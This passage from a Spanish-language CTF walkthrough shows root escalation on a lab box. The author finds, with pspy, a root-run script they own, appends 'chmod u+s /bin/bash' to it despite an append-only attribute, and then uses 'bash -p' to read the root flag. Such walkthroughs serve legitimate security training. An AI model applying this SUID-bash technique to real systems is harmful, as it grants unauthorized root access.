                           ..........  ........,.,,,,,,,,,,,,,,/*,**/*//*/*...................................,*,,,,*/..........                               
                      . ..........  ........,,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,....,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.............                         
     , .              ........   . .........,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,......,,,,,,,,,,,,,,,,,,,,,,,,,...............                       
     ,. ,..           .....      ..........,,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,......,,,,,,,,,,,,,,,,,,,,,...............                       
     , ...,                    ............,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,........,,,,,,,,,,,,...................                       
      *,                     ..................,,.,.,..,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.............,....................                         
                           .........................,....,,.,,,,,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,...............................                          
                              ............................,..,....,,,.,,,,,.,,,,,,,,.,,..,,,,...,,,,...............................

3f2ada6791f96b6a50a9ee43ee6b62df
</span><span class="s2">zenitsu@ubuntu</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
</code></pre></div></div>

<div><p>Con <a href="https://github.com/DominicBreuker/pspy">pspy</a> encontramos que root ejecuta un script del cual somos propietarios</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="na">CMD: UID=0    PID=2273   | sudo /bin/bash /home/zenitsu/to_nezuko/send_message_to_nezuko.sh</span>
</code></pre></div></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">zenitsu@ubuntu</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls -l to_nezuko/send_message_to_nezuko.sh 
-rw-r--r-- 1 zenitsu root 177 Okt  20 10:58 to_nezuko/send_message_to_nezuko.sh
</span><span class="s2">zenitsu@ubuntu</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
</code></pre></div></div>

<div><p>Aunque somos propietarios al intentar escribir nos dice permission denied, revisando permisos, no podemos escribir pero podemos hacer un append</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">zenitsu@ubuntu</span><span class="p">:</span><span class="na">~/to_nezuko</span><span class="p">$ lsattr send_message_to_nezuko.sh 
-----a--------e--- send_message_to_nezuko.sh
</span><span class="s2">zenitsu@ubuntu</span><span class="p">:</span><span class="na">~/to_nezuko</span><span class="p">$</span>
</code></pre></div></div>

<div><p>Hacemos un append de un comando que haga la bash suid y comprobamos que exista</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">zenitsu@ubuntu</span><span class="p">:</span><span class="na">~/to_nezuko</span><span class="p"> echo "chmod u+s /bin/bash" >> send_message_to_nezuko.sh
</span><span class="s2">zenitsu@ubuntu</span><span class="p">:</span><span class="na">~/to_nezuko</span><span class="p">$ cat send_message_to_nezuko.sh 
#!/bin/bash
date=$(date '+%d-%m-%Y_%H:%M')
echo "nezuko chan, would you like to go on a date with me? " > /home/nezuko/from_zenitsu/new_message_$date
chmod u+s /bin/bash
</span><span class="s2">zenitsu@ubuntu</span><span class="p">:</span><span class="na">~/to_nezuko</span><span class="p">$</span>
</code></pre></div></div>

<div><p>Después de un par de minutos, la bash es suid, nos podemos convertir en root</p></div>  

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">zenitsu@ubuntu</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls -l /bin/bash 
-rwsr-xr-x 1 root root 1113504 Apr   5  2018 </span><span class="kd">/bin/bash</span><span class="p">
</span><span class="s2">zenitsu@ubuntu</span><span class="p">:</span><span class="na">~</span><span class="p">$ bash -p
bash-4.4# whoami
root
bash-4.4# hostname -I
192.168.100.30
bash-4.4# cat /root/root.txt
Congratulations on getting the root shell!
Tell me what do you think about this box at my twitter, @yunaranyancat

.................                                                                                          ..........................                  ........
................                                                                                            ........................                   ........
...............                                     ...   .       .                                         ........................                   ........
      .  ... ..                                 ...............................                             ........................                   ........
.    ...........                             ....................................                          .........................                   ........
.  ... .........                          .................,,,,,,,,.................                       .........................                   ........
       .. ......                         ..............,,,,,,,,,,,,,,,,,,............                      .........................                   ........
.       .   ....                        ...........,,,,,,,,,,,,,,,,,,,,,,,,,,.........                      ........................                    ..... .
              .                        .........,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,........                        ......................                    .......
      .  . .                          .......,,,,,,,,,,,,,,,,,,******,*********,.......                        .....................                    .......
          .                          .....,,,,,,,,,,,,,,***,**********************......                          ..................                    .......
                                   ....,,,,,,,,,,***********************************.....                          .................                    .... ..
                                  ...,,,,*********************************************.....                       ..................                    . .....
                                ....**********,.    .,*****************,       ,********....                      ..................                    . .....
                               ...******,  ,***************************************. *****...                     ..................                       .. .
                              ...*** .**************,***********************************,,*,..                    ..................                        ...
                             ..,.,******************.,*****************,..,*****************,.                  ................. .                       .    
                             ..**************,,,.......***************,.,......,*************.                 ............... ...                             
                             .**********************,,,,*************,,.*********************,                ................ .. .                            
                             .**********          .***.,,************,***.            ,.******               .............                                     
                              ******     *(###(/,   **/*,,*********////*   ,(#####(*     *////              ..............                                     
                              ,***    ,##########/,, **///////////////*...,##########(,..  .,/              ...  ..                                            
                               ***..,..,,,,,,,,,,,,/,*///////////////////..,,,*****,,,,*,,.//*             ..  ....       .                                    
                                //////.............//////////////////////............../////*                ..... ..                                          
                                 *////.            ///////////////////////            .((//,                 ..                                                
                                  ,////,          ///////////////////////(,           ((//. .                                                                  
                                   *//.*// ...  **.///////////////////////./ ...... //.//..                                                                    
                                    ///////////////////////////////////////////////,///// .                                                                    
                                     /////////////////////*,,/////////////////////////// .                                                                     
                                  ,. .///////////////////,,,,//////////////////////////,...,                                                                   
                                 , ,,.*///////////////////*,,//////////////////////////,,, ,                                                                   
                                 ,,.,,/////////////////////////////////////////////////,/ ,.                                                                   
                                    ,/,///////////////////////////////////////////////*/                                                                       
                                     */////////////////////////////////////////////////                                                                        
                                      .///////////////,////////////////,//////////////                                                                         
                                        ////////////////.............,//////////////*                                                                          
                                          ///////////////////,,,,//////////////////                                                                            
                                            *////////////////*,,,////////////////                                                                              
                                         .,, , ///////////////////////////////.,,,,,.                                                                          
                                       /,,,, /,,, *////////////////////////..,,/..,,,/                                                                         
                                       /*,,,,,,,,.,.  //////////////////  ,.,,,,,,,,,/                                                                         
                                       ,//,,,,,,,,,,,,,,, ,/////////.,,,,,,,,,,,,,,//                                                                          
                                          *,,,,,,,,,...,,,,,,.   ,,,,,,,,..,,,,,,,.  .//,                                                                      
                                    */*.        .,,,,,,,,,,.,,.,,.,,,,,,,,,,,.       ,**/***                                                                   


3ca33b8158d9dee5c35a7d6d793c7fd5
bash-4.4#</span>
</code></pre></div></div>

<p><a href="./../../">Página Principal</a></p>

      </section>
    </div>
  </body>
</html>
